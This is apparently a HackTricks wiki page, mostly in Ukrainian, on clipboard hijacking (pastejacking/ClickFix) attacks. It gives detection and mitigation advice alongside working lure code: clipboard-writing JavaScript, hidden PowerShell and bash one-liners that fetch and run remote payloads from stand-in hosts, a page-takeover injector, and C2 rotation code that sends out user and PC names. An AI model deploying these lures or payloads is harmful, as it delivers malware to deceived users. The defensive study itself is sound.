# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте нічого, чого ви самі не копіювали." – стара, але все ще слушна порада

## Огляд

Clipboard hijacking – also known as *pastejacking* – зловживає тим фактом, що користувачі рутинно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (or any JavaScript-capable context such as an Electron or Desktop application) програмно поміщає контрольований атакуючим текст у системний clipboard. Жертв заохочують, зазвичай ретельно продуманими social-engineering інструкціями, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *paste* вміст clipboard, що негайно виконує довільні команди.

Оскільки **жоден файл не завантажується і жодне вкладення не відкривається**, ця техніка обходить більшість контролів безпеки e-mail та веб-контенту, які моніторять attachments, macros або пряме виконання команд. Через це атака популярна в phishing кампаніях, що доставляють commodity malware families такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Потік ClickFix / ClearFake

1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад `docusign.sa[.]com`)
2. Інжектований JavaScript **ClearFake** викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка непомітно зберігає у буфері обміну Base64-encoded PowerShell one-liner.
3. HTML-інструкції кажуть жертві: *“Натисніть **Win + R**, вставте команду і натисніть Enter, щоб вирішити проблему.”*
4. `powershell.exe` виконується, завантажуючи архів, який містить легітимний виконуваний файл та шкідливу DLL (класичний DLL sideloading).
5. Лоадер розшифровує додаткові стадії, інжектить shellcode і встановлює persistence (наприклад scheduled task) – в підсумку запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад ланцюжка NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає в своєму каталозі `msvcp140.dll`.
* Зловмисна DLL динамічно отримує вказівники на API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, дешифрує їх за допомогою циклічного XOR-ключа `"https://google.com/"`, впроваджує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) у C:\ProgramData\SecurityCheck_v1\.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader в **cscript.exe**
3. Отримує MSI payload → поміщає `libcef.dll` поруч із підписаною програмою → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю обходять завантаження файлів і просять жертв вставити one‑liner, який отримує та виконує JavaScript через WSH, забезпечує персистентність і щоденно змінює C2. Приклад спостереженого ланцюга:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Обфускований URL перевертається під час виконання, щоб ускладнити поверхневу перевірку.
- JavaScript забезпечує власну стійкість через Startup LNK (WScript/CScript) і обирає C2 за поточним днем — що дозволяє швидку domain rotation.

Мінімальний фрагмент JS, який використовується для ротації C2s за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто пінить TLS на хардкодований сертифікат і розбиває трафік на частини (chunking).

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – перевіряйте на незвичні Base64 / обфусцировані записи.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe` і `NewProcessName` в { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або в тимчасових папках безпосередньо перед підозрілим подією 4688.
* EDR clipboard sensors (if present) – корелюйте `Clipboard Write`, після якого відразу з’являється новий PowerShell процес.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Недавні кампанії масово генерують фейкові CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-specific команди з їхнього clipboard і вставляти їх у native consoles. Це виводить виконання за межі browser sandbox і працює як на Windows, так і на macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні decoys/no-ops для неподтримуваних OS, щоб підтримати ілюзію.
- Automatic clipboard-copy при benign UI діях (checkbox/Copy), тоді як видимий текст може відрізнятися від clipboard content.
- Mobile blocking і поповер з покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Опціональна обфускація і single-file injector для перезапису DOM скомпрометованого сайту верифікаційним UI в стилі Tailwind (не потрібно реєструвати новий домен).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence при початковому запуску
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.

Безпосереднє захоплення сторінки на скомпрометованих сайтах
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Сторінки, які прив'язують Clipboard API до віджетів верифікації; невідповідність між відображеним текстом і clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI інсталятори запускаються з `%TEMP%`.
- macOS endpoint: Terminal/iTerm запускають `bash`/`curl`/`base64 -d` з `nohup` поблизу подій браузера; фонові завдання, що переживають закриття терміналу.
- Корелюйте історію `RunMRU` Win+R та записи в clipboard з наступним створенням консольних процесів.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Заходи пом'якшення

1. Жорсткіші налаштування браузера – вимкнути clipboard write-access (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати дію користувача.
2. Підвищення обізнаності – навчати користувачів *вводити вручну* чутливі команди або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liners.
4. Мережевий контроль – блокувати вихідні запити до відомих доменів pastejacking та malware C2.

## Пов'язані трюки

* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів у зловмисний сервер:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Посилання

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
